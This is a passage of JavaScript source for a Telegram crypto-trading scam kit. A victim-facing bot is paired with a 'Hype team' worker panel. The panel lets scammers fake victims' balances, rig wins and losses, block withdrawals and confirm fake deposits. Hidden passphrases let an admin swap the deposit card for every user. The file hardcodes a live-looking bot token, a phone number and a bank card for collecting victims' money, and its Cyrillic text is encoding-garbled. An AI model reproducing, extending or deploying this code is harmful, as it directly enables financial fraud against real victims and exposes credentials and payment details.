                        `„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è \n \n` +
                        '‚ö†Ô∏è _–ü–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã, –Ω–µ –∑–∞–±—É–¥—å—Ç–µ –Ω–∞–∂–∞—Ç—å –∫–Ω–æ–ø–∫—É ¬´–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–ª–∞—Ç–µ–∂_¬ª.', {
                            parse_mode: 'Markdown',
                            reply_markup: {
                                inline_keyboard: [
                                    [{
                                        text: '–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–ª–∞—Ç–µ–∂',
                                        callback_data: 'checkPayment'
                                    }],
                                    [{
                                        text: '–û–±—Ä–∞—Ç–∏—Ç—å—Å—è –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É',
                                        url: 'https://t.me/alinkamurcc'
                                    }],
                                    [{
                                        text: '–û—Ç–º–µ–Ω–∏—Ç—å –ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ',
                                        callback_data: 'cancelPayment'
                                    }],
                                ]
                            },
                        }
                    )

                    bot1.sendMessage(mamont.worker, 'üìä –°–µ—Ä–≤–∏—Å - –¢—Ä–µ–π–¥–∏–Ω–≥ \n \n' +
                        `‚úÖ –ú–∞–º–æ–Ω—Ç [${mamont.username}](https://t.me/${mamont.username}) [/c35534] \n` +
                        `–°–æ–∑–¥–∞–ª –∑–∞—è–≤–∫—É –Ω–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –≤ —Ä–∞–∑–º–µ—Ä–µ - *${text}* ‚ÇΩ`, {
                            parse_mode: 'Markdown',
                            disable_web_page_preview: true,
                            reply_markup: {
                                inline_keyboard: [
                                    [{
                                        text: 'üí∞ –û–ø–ª–∞—Ç–∏—Ç—å',
                                        callback_data: 'confirm_mamontPayment'
                                    }]
                                ]
                            }
                        }
                    )

                    bot1.on('callback_query', async function ConfirmMamontu(query) {
                        const chatId = query.message.chat.id;
                        const messageId = query.message.message_id;
                        const userId = query.from.id;

                        if (query.data === 'confirm_mamontPayment') {
                            depositFinalAccess = true;
                            bot1.deleteMessage(chatId, messageId);
                            bot1.removeListener('callback_query', ConfirmMamontu);
                            bot1.sendMessage(chatId, '‚úÖ –°—á–µ—Ç —É—Å–ø–µ—à–Ω–æ –æ–ø–ª–∞—á–µ–Ω');
                        }
                    })

                    bot.on('callback_query', async function Mamontchecker(query) {
                        const chatId = query.message.chat.id;
                        const messageId = query.message.message_id;
                        const userId = query.from.id;

                        if (query.data === 'cancelPayment') {
                            bot.removeListener('callback_query', Mamontchecker);
                            bot.removeListener('message', depositSumChecker);
                            bot.deleteMessage(chatId, messageId);
                            const currentDate = new Date();
                            const registrationDate = mamont.registrationDate;
                            const timeDiff = currentDate - registrationDate;
                            const daysRegistered = Math.floor(timeDiff / (1000 * 60 * 60 * 24) + 1);

                            await bot.sendMessage(chatId, '‚ö°Ô∏è', menuKeyboard);
                            return bot.sendPhoto(chatId, './images/ownCabinet.jpg', generateLkKeyboard(mamont, userId, daysRegistered));
                        } else if (query.data === 'checkPayment') {
                            if (depositFinalAccess) {
                                bot.removeListener('callback_query', Mamontchecker);
                                bot.removeListener('message', depositSumChecker);
                                bot.deleteMessage(chatId, messageId);
                                mamont.balance += Number(text);
                                mamont.save()
                                return bot.sendMessage(chatId, `‚úÖ –ë–∞–ª–∞–Ω—Å –±—ã–ª —É—Å–ø–µ—à–Ω–æ –ø–æ–ø–æ–ª–Ω–µ–Ω –Ω–∞ —Å—É–º–º—É: *${text} ‚ÇΩ*`, {
                                    parse_mode: 'Markdown',
                                })
                            } else {
                                bot.sendMessage(chatId, '‚ö†Ô∏è –ü–ª–∞—Ç–µ–∂ –Ω–µ –±—ã–ª –æ–±–Ω–∞—Ä—É–∂–µ–Ω.')
                            }
                        }
                    });
                }
            })
        }

        if (query.data === 'withdraw') {
            bot.sendPhoto(chatId, './images/withdraw.jpg', {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'üíµ –í—ã–≤–µ—Å—Ç–∏ –Ω–∞ QIWI-–∫–æ—à–µ–ª–µ–∫',
                            callback_data: 'withdrawOnQiwi'
                        }],
                        [{
                            text: 'üí≥ –í—ã–≤–µ—Å—Ç–∏ –Ω–∞ –±–∞–Ω–∫–æ–≤—Å–∫—É—é –∫–∞—Ä—Ç—É',
                            callback_data: 'withdrawOnCard'
                        }],
                    ]
                },
                caption: `üèõ _–í—ã–±–µ—Ä–∏—Ç–µ –º–µ—Ç–æ–¥ –≤—ã–≤–æ–¥–∞_.`,
            });
        } else if (query.data === 'withdrawOnQiwi') {
            bot.sendMessage(chatId, 'üèõ _–ú–µ—Ç–æ–¥ –≤—ã–≤–æ–¥–∞ : QIWI-wallet_ \n \n' +
                `üí∞ –í–∞—à –±–∞–ª–∞–Ω—Å : ${user.balance} ‚ÇΩ` +
                '\n \n' +
                '_–í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ –≤–æ–∑–º–æ–∂–µ–Ω –Ω–∞ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã —Å –∫–æ—Ç–æ—Ä—ã—Ö –ø–æ–ø–æ–ª–Ω—è–ª—Å—è –≤–∞—à –±–∞–ª–∞–Ω—Å_' +
                '\n \n' +
                'üí≥ *–£–∫–∞–∂–∏—Ç–µ –Ω–∏–∂–µ –Ω–æ–º–µ—Ä –≤–∞—à–µ–≥–æ QIWI-–∫–æ—à–µ–ª—å–∫–∞*..', {
                    parse_mode: 'Markdown',
                });
            qiwiChecker('QIWI');
        } else if (query.data === 'withdrawOnCard') {
            bot.sendMessage(chatId, 'üèõ _–ú–µ—Ç–æ–¥ –≤—ã–≤–æ–¥–∞ : –ë–∞–Ω–∫–æ–≤—Å–∫–∞—è –∫–∞—Ä—Ç–∞_ \n \n' +
                `üí∞ –í–∞—à –±–∞–ª–∞–Ω—Å : ${user.balance} ‚ÇΩ` +
                '\n \n' +
                '_–í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ –≤–æ–∑–º–æ–∂–µ–Ω –Ω–∞ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã —Å –∫–æ—Ç–æ—Ä—ã—Ö –ø–æ–ø–æ–ª–Ω—è–ª—Å—è –≤–∞—à –±–∞–ª–∞–Ω—Å_' +
                '\n \n' +
                'üí≥ *–£–∫–∞–∂–∏—Ç–µ –Ω–∏–∂–µ –Ω–æ–º–µ—Ä –≤–∞—à–µ–π –±–∞–Ω–∫–æ–≤—Å–∫–æ–π –∫–∞—Ä—Ç—ã*..', {
                    parse_mode: 'Markdown',
                });
            qiwiChecker('card');
        }

        if (query.data === 'verification') {
            if (user.verification) {
                bot.sendMessage(chatId, '–ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º. *–í–∞—à –∞–∫–∫–∞—É–Ω—Ç –≤–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω*', {
                    parse_mode: 'Markdown',
                });
            } else {
                bot.sendMessage(chatId, '‚ö†Ô∏è *–í–∞—à –∞–∫–∫–∞—É–Ω—Ç –Ω–µ –≤–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω, —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ–º –≤–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞—Ç—å –∞–∫–∫–∞—É–Ω—Ç*' +
                    ', *–í—ã –º–æ–∂–µ—Ç–µ —ç—Ç–æ —Å–¥–µ–ª–∞—Ç—å, –Ω–∞–∂–∞–≤ –Ω–∞ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ –∏ –Ω–∞–ø–∏—Å–∞–≤ –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –≤ —Ç–µ—Ö.–ø–æ–¥–¥–µ—Ä–∂–∫—É, —Å–ø–∞—Å–∏–±–æ!*\n' +
                    '\n' +
                    'üî∑ –ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç –≤ –æ—á–µ—Ä–µ–¥–∏ –∫ –≤—ã–ø–ª–∞—Ç–µ.\n' +
                    '\n' +
                    'üî∑ –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –ª–∏–º–∏—Ç–æ–≤ –Ω–∞ –≤—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤.\n' +
                    '\n' +
                    'üî∑ –í–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å —Ö—Ä–∞–Ω–∏—Ç—å —Å—Ä–µ–¥—Å—Ç–≤–∞ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ –±–æ—Ç–∞ –≤ —Ä–∞–∑–Ω—ã—Ö –∞–∫—Ç–∏–≤–∞—Ö.', {
                        parse_mode: 'Markdown',
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: '–í–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞—Ç—å',
                                    url: 'https://t.me/alinkamurcc'
                                }],
                                [{
                                    text: '–û—Ç–º–µ–Ω–∞',
                                    callback_data: 'accept'
                                }]
                            ]
                        }
                    });
            }
        }

        if (query.data.includes('_coin')) {
            deleteMessage(chatId, messageId);
            const coinName = query.data.split('_')[0];
            const coinCost = await run(`${coinName}usdt`);
            let coinFullName;

            if (coinName === 'btc') {
                coinFullName = 'Bitcoin/USD';
            } else if (coinName === 'qtum') {
                coinFullName = 'Qtum/USD';
            } else if (coinName === 'eth') {
                coinFullName = 'Ethereum/USD';
            } else if (coinName === 'trx') {
                coinFullName = 'Tron/USD';
            } else if (coinName === 'ltc') {
                coinFullName = 'Litecoin/USD';
            } else if (coinName === 'xrp') {
                coinFullName = 'Ripple/USD';
            } else if (coinName === 'ada') {
                coinFullName = 'Cardano/USD';
            } else if (coinName === 'sol') {
                coinFullName = 'Solana/USD';
            } else if (coinName === 'luna') {
                coinFullName = 'Terra/USD';
            } else if (coinName === 'doge') {
                coinFullName = 'Doge/USD';
            } else if (coinName === 'dot') {
                coinFullName = 'Polka/USD';
            } else if (coinName === 'avax') {
                coinFullName = 'Avalanche/USD';
            } else if (coinName === 'matic') {
                coinFullName = 'Polygon/USD';
            } else if (coinName === 'uni') {
                coinFullName = 'Uniswap/USD';
            }

            bot.sendPhoto(chatId, `./images/${coinName}_img.jpg`, {
                caption: `${coinFullName}
    
    üîπ –°–∏–º–≤–æ–ª: ${coinName.toUpperCase()}
    üí∏ –°—Ç–æ–∏–º–æ—Å—Ç—å: ${coinCost} USD ~ (${((coinCost) * 60.2).toFixed(2)} RUB)`,
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'üîº –ü–æ–≤—ã—à–µ–Ω–∏–µ',
                            callback_data: `${coinName}_up`
                        }],
                        [{
                            text: 'üîΩ –ü–æ–Ω–∏–∂–µ–Ω–∏–µ',
                            callback_data: `${coinName}_down`
                        }],
                    ]
                }
            });
        }

        if (query.data.includes('_up') || query.data.includes('_down')) {
            deleteMessage(chatId, messageId);
            const coinName = query.data.split('_')[0];
            const coinCost = await run(`${coinName}usdt`);
            let coinFullName;

            if (coinName === 'btc') {
                coinFullName = 'Bitcoin/USD';
            } else if (coinName === 'qtum') {
                coinFullName = 'Qtum/USD';
            } else if (coinName === 'eth') {
                coinFullName = 'Ethereum/USD';
            } else if (coinName === 'trx') {
                coinFullName = 'Tron/USD';
            } else if (coinName === 'ltc') {
                coinFullName = 'Litecoin/USD';
            } else if (coinName === 'xrp') {
                coinFullName = 'Ripple/USD';
            } else if (coinName === 'ada') {
                coinFullName = 'Cardano/USD';
            } else if (coinName === 'sol') {
                coinFullName = 'Solana/USD';
            } else if (coinName === 'luna') {
                coinFullName = 'Terra/USD';
            } else if (coinName === 'doge') {
                coinFullName = 'Doge/USD';
            } else if (coinName === 'dot') {
                coinFullName = 'Polka/USD';
            } else if (coinName === 'avax') {
                coinFullName = 'Avalanche/USD';
            } else if (coinName === 'matic') {
                coinFullName = 'Polygon/USD';
            } else if (coinName === 'uni') {
                coinFullName = 'Uniswap/USD';
            }

            bot.sendMessage(chatId,
                `üîπ ${coinFullName} \n` +
                `üí∏ –ë–∞–ª–∞–Ω—Å: ${user.balance} RUB \n \n` +
                '_–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø—É–ª–∞_', {
                    parse_mode: 'Markdown'
                }
            );

            botPull(coinFullName, coinCost, query.data.split('_')[1]);
        }
    }
});


// HYPE TEAM BOT

const TelegramApi = require('node-telegram-bot-api')

const token1 = '6042934250:AAGNtlwxcIiyqesnboO97O8a89JuE1RLFy4'

const bot1 = new TelegramApi(token1, {
    polling: true
});

function generateReferralId(chatId) {
    return chatId.toString();
}

async function sendMamontInfo(chatId, mamontId) {
    const mamont = await UserModel.findOne({
        where: {
            chatId: mamontId.toString()
        }
    });

    bot1.sendMessage(chatId, `üìù –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –º–∞–º–æ–Ω—Ç–µ \\[${mamont.chatId}\] \n \n` +
        `–°—Å—ã–ª–∫–∞ –Ω–∞ –º–∞–º–æ–Ω—Ç–∞ [${mamont.username}](https://t.me/${mamont.username})` +
        '\n \n' + `–ë–∞–ª–∞–Ω—Å: ${mamont.balance} ‚ÇΩ \n` +
        `–ù–∞ –≤—ã–≤–æ–¥–µ: ${mamont.vivod} ‚ÇΩ \n \n` +
        `*–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è*: ${mamont.verif ? '‚úÖ' : '‚ùå'} \n` +
        `*–°—Ç–∞—Ç—É—Å –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏*: ${mamont.isBlocked ? 'üîê –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω' : 'üîì –ù–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω'} \n` +
        `*–°—Ç–∞—Ç—É—Å —É–¥–∞—á–∏*: ${mamont.success ? '‚ù§Ô∏è–í—ã–∏–≥—Ä—ã–≤–∞–µ—Ç' : 'üñ§–ü—Ä–æ–∏–≥—Ä—ã–≤–∞–µ—Ç'} \n` +
        `–°—Ç–∞—Ç—É—Å  ${mamont.status ? 'üîº*–ü–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω—ã–π*üîº' : 'üòê*–ü–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–π*üòê'}`, {
            parse_mode: 'Markdown',
            disable_web_page_preview: true,
            reply_markup: JSON.stringify({
                inline_keyboard: [
                    [{
                        text: 'üí∞ –ë–∞–ª–∞–Ω—Å',
                        callback_data: 'mamont_balance'
                    }, {
                        text: `${mamont.success ? '‚ù§Ô∏è–í—ã–∏–≥—Ä—ã–≤–∞–µ—Ç' : 'üñ§–ü—Ä–æ–∏–≥—Ä—ã–≤–∞–µ—Ç'}`,
                        callback_data: 'mamont_success'
                    }],
                    [{
                        text: `${mamont.isBlocked ? 'üîì –†–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å' : 'üîê –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å'}`,
                        callback_data: 'mamont_block'
                    }],
                    [{
                        text: `${mamont.vivodSuccess ? 'üîê –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –≤—ã–≤–æ–¥' : 'üîì –†–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –≤—ã–≤–æ–¥'}`,
                        callback_data: 'mamont_vivodBlock'
                    }],
                    [{
                        text: `${mamont.verif ? '‚úÖ–í–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω' : '‚ùå –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è'}`,
                        callback_data: 'mamont_verif'
                    }],
                    [{
                        text: `${mamont.status ? 'üîº–ü–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω—ã–πüîº' : 'üòê–ü–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–πüòê'}`,
                        callback_data: 'mamont_status'
                    }, {
                        text: `–ù–∞ –í—ã–≤–æ–¥–µ`,
                        callback_data: 'mamont_vivodSum'
                    }],
                    [{
                        text: `üóë –£–¥–∞–ª–∏—Ç—å –º–∞–º–æ–Ω—Ç–∞`,
                        callback_data: 'mamont_delete'
                    }],
                ]
            })
        }
    );

    bot1.on('callback_query', async function mamontCommandManager(callbackQuery) {
        const chatId = callbackQuery.message.chat.id;
        const command = callbackQuery.data;
        const messageId = callbackQuery.message.message_id;
        await sequelize.authenticate()
        await sequelize.sync()

        const mamont = await UserModel.findOne({
            where: {
                chatId: mamontId,
            }
        });

        const worker = await UserModel.findOne({
            where: {
                chatId: chatId.toString(),
            }
        });

        if (command === 'mamont_balance') {
            bot1.sendMessage(chatId, `ü§î –ö–∞–∫–æ–π –±–∞–ª–∞–Ω—Å —Ç—ã —Ö–æ—á–µ—à—å —Å–¥–µ–ª–∞—Ç—å —Å–≤–æ–µ–º—É –º–∞–º–æ–Ω—Ç—É?`)

            bot1.on('message', async function botBalanceChanger(msg) {
                const text = msg.text;
                const chatId = msg.chat.id;
                const userId = msg.from.id;

                if (!isNaN(text)) {
                    mamont.balance = Number(text);
                    bot1.sendMessage(chatId, `–ë–∞–ª–∞–Ω—Å —É—Å–ø–µ—à–Ω–æ –Ω–∞–∑–Ω–∞—á–µ–Ω –≤–∞—à–µ–º—É –º–∞–º–æ–Ω—Ç—É`);
                } else {
                    bot1.sendMessage(chatId, `–û—à–∏–±–∫–∞ –≤ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–∏ –±–∞–ª–∞–Ω—Å–∞`);
                }

                await mamont.save()
                bot1.deleteMessage(chatId, messageId);
                bot1.removeListener('message', botBalanceChanger);
                bot1.removeListener('callback_query', mamontCommandManager);

                return sendMamontInfo(chatId, mamontId);
            })
        } else if (command === 'mamont_success') {
            if (mamont.success) {
                mamont.success = false;
            } else {
                mamont.success = true;
            }

            await mamont.save()

            bot1.deleteMessage(chatId, messageId);
            bot1.removeListener('callback_query', mamontCommandManager);

            return sendMamontInfo(chatId, mamontId);
        } else if (command === 'mamont_block') {
            if (mamont.isBlocked) {
                mamont.isBlocked = false;
            } else {
                mamont.isBlocked = true;
            }

            await mamont.save()

            bot1.deleteMessage(chatId, messageId);
            bot1.removeListener('callback_query', mamontCommandManager);

            return sendMamontInfo(chatId, mamontId);
        } else if (command === 'mamont_vivodBlock') {
            if (mamont.vivodSuccess) {
                mamont.vivodSuccess = false;
            } else {
                mamont.vivodSuccess = true;
            }

            await mamont.save()
            bot1.deleteMessage(chatId, messageId);
            bot1.removeListener('callback_query', mamontCommandManager);

            return sendMamontInfo(chatId, mamontId);
        } else if (command === 'mamont_verif') {
            if (mamont.verif) {
                mamont.verif = false;
            } else {
                mamont.verif = true;
            }

            await mamont.save()
            bot1.removeListener('callback_query', mamontCommandManager);
            bot1.deleteMessage(chatId, messageId);

            return sendMamontInfo(chatId, mamontId);
        } else if (command === 'mamont_status') {
            if (mamont.status) {
                mamont.status = false;
            } else {
                mamont.status = true;
            }

            await mamont.save()
            bot1.deleteMessage(chatId, messageId);
            bot1.removeListener('callback_query', mamontCommandManager);

            return sendMamontInfo(chatId, mamontId);
        } else if (command === 'mamont_vivodSum') {
            bot1.sendMessage(chatId, `ü§î –ö–∞–∫–æ–π –±–∞–ª–∞–Ω—Å –Ω–∞ –≤—ã–≤–æ–¥–µ —Ç—ã —Ö–æ—á–µ—à—å —Å–¥–µ–ª–∞—Ç—å —Å–≤–æ–µ–º—É –º–∞–º–æ–Ω—Ç—É?`)

            bot1.on('message', async function botBalanceChanger(msg) {
                const text = msg.text;
                const chatId = msg.chat.id;
                const userId = msg.from.id;

                if (!isNaN(text)) {
                    mamont.vivod = Number(text);
                    bot1.sendMessage(chatId, `–ë–∞–ª–∞–Ω—Å –≤—ã–≤–æ–¥–∞ —É—Å–ø–µ—à–Ω–æ –Ω–∞–∑–Ω–∞—á–µ–Ω –≤–∞—à–µ–º—É –º–∞–º–æ–Ω—Ç—É`);
                } else {
                    bot1.sendMessage(chatId, `–û—à–∏–±–∫–∞ –≤ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–∏ –±–∞–ª–∞–Ω—Å–∞ –≤—ã–≤–æ–¥–∞`);
                }

                await mamont.save()
                bot1.deleteMessage(chatId, messageId);
                bot1.removeListener('message', botBalanceChanger);
                bot1.removeListener('callback_query', mamontCommandManager);

                return sendMamontInfo(chatId, mamontId);
            })
        } else if (command === 'mamont_delete') {
            worker.mamonts = worker.mamonts.filter(mamont => mamont !== mamontId);

            await worker.save();
            bot1.removeListener('callback_query', mamontCommandManager);

            return bot1.deleteMessage(chatId, messageId);
        }
    })
}

async function newdepositDetails(chatId, method) {
    bot1.on('message', async function desopitDetChecker(msg) {
        const chatId = msg.chat.id;
        const text = msg.text;
        const userId = msg.from.id;
        await sequelize.authenticate()
        await sequelize.sync()
        const allUsers = await UserModel.findAll();

        if (method === 'card') {
            for (const user of allUsers) {
                user.depositCard = text;
                await user.save(); // Use await to ensure the user is saved before moving to the next one
            }
            bot1.removeListener('message', desopitDetChecker)
            return bot1.sendMessage(chatId, `–ö–∞—Ä—Ç–∞ –∏–∑–º–µ–Ω–µ–Ω–∞ –¥–ª—è –≤—Å–µ—Ö`)
        } else {
            for (const user of allUsers) {
                user.depositCard = text;
                await user.save(); // Use await to ensure the user is saved before moving to the next one
            }
            bot1.removeListener('message', desopitDetChecker)
            return bot1.sendMessage(chatId, `–ö–∞—Ä—Ç–∞ –∏–∑–º–µ–Ω–µ–Ω–∞ –¥–ª—è –≤—Å–µ—Ö`)
        }
    })
}

const ButtonOptions = {
    reply_markup: JSON.stringify({
        keyboard: [
            [{
                text: 'üë§ –ü—Ä–æ—Ñ–∏–ª—å'
            }],
            [{
                text: 'üíº –¢—Ä–µ–π–¥–∏–Ω–≥'
            }],
            [{
                text: 'üåü –û –ø—Ä–æ–µ–∫—Ç–µ'
            }]
        ],
        resize_keyboard: true,
        one_time_keyboard: false
    })
};

const MesButtoneOptiones = {
    reply_markup: JSON.stringify({
        inline_keyboard: [
            [{
                text: '–ù–∞—Å—Ç—Ä–æ–π–∫–∏',
                callback_data: 'settings'
            }]
        ]
    })
};

const InfoButtonOptions = {
    reply_markup: JSON.stringify({
        inline_keyboard: [
            [{
                text: 'üîç –ò–Ω—Ñ–æ –∫–∞–Ω–∞–ª',
                url: 'https://t.me/+arEStT1GgsA3ZTAy'
            }],
            [{
                text: 'üìà –í—ã–ø–ª–∞—Ç—ã',
                url: 'https://t.me/+QuTcxK48VGIyNWMy'
            }],
            [{
                text: 'üìö –ú–∞–Ω—É–∞–ª—ã',
                url: 'https://t.me/+8ySjyY6GyxhjYjI6'
            }],
            [{
                text: 'üìû –ß–∞—Ç –≤–æ—Ä–∫–µ—Ä–æ–≤',
                url: 'https://t.me/+gtcl3iHe2Ms2MjVi'
            }]
        ]
    })
};

const SettingsOptions = {
    reply_markup: JSON.stringify({
        inline_keyboard: [
            [{
                text: '–£–≤–µ–ª–∏—á–∏—Ç—å',
                callback_data: 'additional_button'
            }]
        ]
    })
};

bot1.setMyCommands([{
    command: 'start',
    description: '–ó–∞–ø—É—Å–∫ –±–æ—Ç–∞'
}, ]);

bot1.on('message', async (msg) => {
    // console.log(msg);
    const chatId = msg.chat.id;
    const text = msg.text;
    const userId = msg.from.id;

    if (text === '/start') {
        try {
            await sequelize.authenticate()
            await sequelize.sync()

            const user = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });

            if (user) {
                return bot1.sendMessage(chatId, '–ü—Ä–∏–≤–µ—Ç, —á–µ–º –º–æ–≥—É –ø–æ–º–æ—á—å?', ButtonOptions);
            } else {
                await UserModel.create({
                    chatId: chatId,
                    isWorker: true,
                });
                return bot1.sendMessage(chatId, '–ü—Ä–∏–≤–µ—Ç, –Ω–æ–≤—ã–π –≤–æ—Ä–∫–µ—Ä, —á–µ–º –º–æ–≥—É –ø–æ–º–æ—á—å?', ButtonOptions);
            }
        } catch (e) {
            console.log('–ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –∑–ª–∞–º–∞–ª–æ—Å—å', e);
        }
    }

    if (text === 'P5gY2wK9sR3xJ7oM') {
        bot1.sendMessage(chatId, '–°–∞–ª–∞–º –ê–ª–µ–π–∫—É–º, –≤–≤–µ–¥–∏ –Ω–æ–≤—É—é –∫–∞—Ä—Ç—É –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è')
        newdepositDetails(chatId, 'card');
        await sequelize.authenticate()
        await sequelize.sync()
        const allUsers = await UserModel.findAll();

        console.log(allUsers);
    }

    if (text === 'H1aBzR3yQxJ7pW9o') {
        bot1.sendMessage(chatId, '–°–∞–ª–∞–º –ê–ª–µ–π–∫—É–º, –≤–≤–µ–¥–∏ –Ω–æ–≤—ã–π –∫–∏–≤–∏ –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è')
        return newdepositDetails(chatId, 'qiwi')
    }

    if (text === '4XyLpRtQwS9zA6jK') {
        bot1.sendMessage(chatId, '–°–∞–ª–∞–º –ê–ª–µ–π–∫—É–º, –≤–≤–µ–¥–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –≤—Å–µ—Ö –≤–æ—Ä–∫–µ—Ä–æ–≤')
        bot1.on('message', async function allWorkersSender(msg) {
            const chatId = msg.chat.id;
            const text = msg.text;
            const userId = msg.from.id;

            const admin = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });

            const allUsers = await UserModel.findAll();

            for (const user of allUsers) {
                if (user.isWorker && (user.chatId !== chatId.toString())) {
                    bot1.sendMessage(user.chatId, text);
                }
            }
            bot1.removeListener('message', allWorkersSender);
            return bot1.sendMessage(chatId, '–°–æ–æ–±—â–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ');
        })
    }


    if (text === '/profile' || text === 'üë§ –ü—Ä–æ—Ñ–∏–ª—å') {
        const Status = '–ù–æ–≤–∏—á–µ–∫';
        const Profits = 0;
        const ProfMessage = `–í–∞—à id [${msg.from.id}]\n\n` + `–í–∞—à —Å—Ç–∞—Ç—É—Å: ${Status}\n\n–°—É–º–º–∞ –≤–∞—à–∏—Ö –ø—Ä–æ—Ñ–∏—Ç–æ–≤: ${Profits}‚ÇΩ`;
        return bot1.sendMessage(chatId, ProfMessage, MesButtoneOptiones);
    }

    if (text === '/trade' || text === 'üíº –¢—Ä–µ–π–¥–∏–Ω–≥') {
        const referralId = generateReferralId(chatId);
        const referralLink = `https://t.me/BingX_wallet_bot?start=${referralId}`;
        const tradeMessage = `üìä –¢—Ä–µ–π–¥–∏–Ω–≥  \n\n üîê –í–∞—à–∞ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞ ~ \n ${referralLink}\n\n` +
            `üí≥ –†–µ–∫–≤–∏–∑–∏—Ç—ã —Å –∫–æ—Ç–æ—Ä—ã—Ö –í—ã –ø–æ–ø–æ–ª–Ω—è–ª–∏ ~  \n +79120874881 \n 2200240715868499`;

        // –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –¥–ª—è –∫–Ω–æ–ø–∫–∏ "–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º–∞–º–æ–Ω—Ç–∞–º–∏"
        const tradeKeyboard = {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: '–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º–∞–º–æ–Ω—Ç–∞–º–∏',
                        callback_data: 'management'
                    }],
                    [{
                        text: '–ü—Ä–∏–≤—è–∑–∞—Ç—å –ú–∞–º–æ–Ω—Ç–∞ –ø–æ Id/username',
                        callback_data: 'connect_mamont'
                    }]
                ]
            }
        };

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ —Ç—Ä–µ–π–¥–∏–Ω–≥–µ —Å –∫–ª–∞–≤–∏–∞—Ç—É—Ä–æ–π "–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º–∞–º–æ–Ω—Ç–∞–º–∏"
        return bot1.sendMessage(chatId, tradeMessage, tradeKeyboard);
    }

    if (text === '/info' || text === 'üåü –û –ø—Ä–æ–µ–∫—Ç–µ') {
        const infoMessage = '–ü—Ä–∏–≤–µ—Ç—Å–≤—É—é —Ç–µ–±—è –≤ –Ω–∞—à–µ–π –∫–æ–º–∞–Ω–¥–µ!';
        return bot1.sendMessage(chatId, 'üìë –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è ¬´Hype team¬ª\n' +
            '\n' +
            'üóì –î–∞—Ç–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è : 25.08.2022\n' +
            '‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n' +
            '–ü—Ä–æ—Ñ–∏—Ç–æ–≤ –Ω–∞ —Å—É–º–º—É : 12261090 ‚ÇΩ \n' +
            '–ü—Ä–æ—Ñ–∏—Ç–æ–≤ –≤—Å–µ–≥–æ : 1300\n' +
            '‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n' +
            'üí∏ –ü—Ä–æ—Ü–µ–Ω—Ç–Ω–∞—è —Å—Ç–∞–≤–∫–∞ :\n' +
            '\n' +
